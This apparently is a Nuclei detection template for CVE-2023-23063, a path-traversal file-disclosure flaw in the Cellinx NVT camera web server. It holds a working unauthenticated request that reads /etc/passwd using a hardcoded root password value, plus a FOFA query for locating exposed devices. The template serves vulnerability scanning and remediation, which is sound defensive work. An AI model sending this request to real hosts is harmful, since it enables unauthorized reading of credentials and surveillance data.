http:
- matchers:
  - condition: and
    dsl:
    - status_code == 200
    - regex('root:.*:0:0:', body)
    - contains(header, 'TRACKID=')
    type: dsl
  method: GET
  path:
  - '{{BaseURL}}/cgi-bin/GetFileContent.cgi?USER=root&PWD=D1D1D1D1D1D1D1D1D1D1D1D1A2A2B0A1D1D1D1D1D1D1D1D1D1D1D1D1D1D1B8D1&PATH=/etc/passwd'
id: CVE-2023-23063
info:
  author: daffainfo
  classification:
    cpe: cpe:2.3:a:cellinx:nvt_web_server:1.0.6.002b:*:*:*:*:*:*:*
    cve-id: CVE-2023-23063
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N
    cvss-score: 7.5
    cwe-id: CWE-22
    epss-percentile: 0.98256
    epss-score: 0.62021
  description: 'Cellinx NVT v1.0.6.002b was discovered to contain a local file disclosure
    vulnerability via the component /cgi-bin/GetFileContent.cgi.

    '
  impact: 'Unauthenticated attackers can read arbitrary files from the server through
    the PATH parameter in GetFileContent.cgi, potentially exposing system credentials,
    configuration files, and sensitive video surveillance data.

    '
  metadata:
    fofa-query: body="/viewer/viewer.html" && header="lighttpd" && country="KR"
    max-request: 1
    product: nvt_web_server
    vendor: cellinx
    verified: true
  name: Cellinx NVT Web Server - Local File Disclosure
  reference:
  - https://github.com/ahmedalroky/Disclosures/tree/cellinx
  - http://nvd.nist.gov/vuln/detail/CVE-2023-23063
  remediation: 'Update Cellinx NVT to a version newer than 1.0.6.002b that validates
    file paths in GetFileContent.cgi and restricts file access to authorized directories
    only.

    '
  severity: high
  tags: cve,cve2023,cellinx,lfi,nvt,vkev,vuln
